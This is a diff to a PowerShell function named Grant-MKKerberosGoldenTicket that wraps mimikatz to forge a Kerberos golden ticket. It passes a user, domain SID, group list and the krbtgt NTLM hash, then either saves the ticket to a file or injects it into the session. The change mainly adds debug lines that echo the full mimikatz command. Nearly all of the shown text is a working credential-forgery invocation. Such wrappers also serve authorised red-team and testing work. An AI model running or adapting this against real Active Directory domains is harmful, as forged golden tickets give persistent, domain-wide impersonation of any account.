@@ -77,10 +77,12 @@ function Grant-MKKerberosGoldenTicket {
     $GroupString = $groups -join ','
 
     if ($TicketPath) {
+        Write-Debug " mimikatz.exe privilege::debug `"kerberos::golden /user:$User /domain:$Domain /sid:$Sid /Id:$Id /rc4:$KrbtgtNtlmHash /groups:$GroupString /ticket:$TicketPath`" exit"
+
         mimikatz.exe privilege::debug "kerberos::golden /user:$User /domain:$Domain /sid:$Sid /Id:$Id /rc4:$KrbtgtNtlmHash /groups:$GroupString /ticket:$TicketPath" exit   
     } else {
 
-        Write-Debug " mimikatz.exe privilege::debug `"kerberos::golden /user:$User /domain:$Domain /sid:$Sid /rc4:$KrbtgtNtlmHash /groups:$GroupString /ptt`" exit"
+        Write-Debug " mimikatz.exe privilege::debug `"kerberos::golden /user:$User /domain:$Domain /sid:$Sid /Id:$Id /rc4:$KrbtgtNtlmHash /groups:$GroupString /ptt`" exit"
 
         mimikatz.exe privilege::debug "kerberos::golden /user:$User /domain:$Domain /sid:$Sid  /Id:$Id /rc4:$KrbtgtNtlmHash /groups:$GroupString /ptt" exit
     }
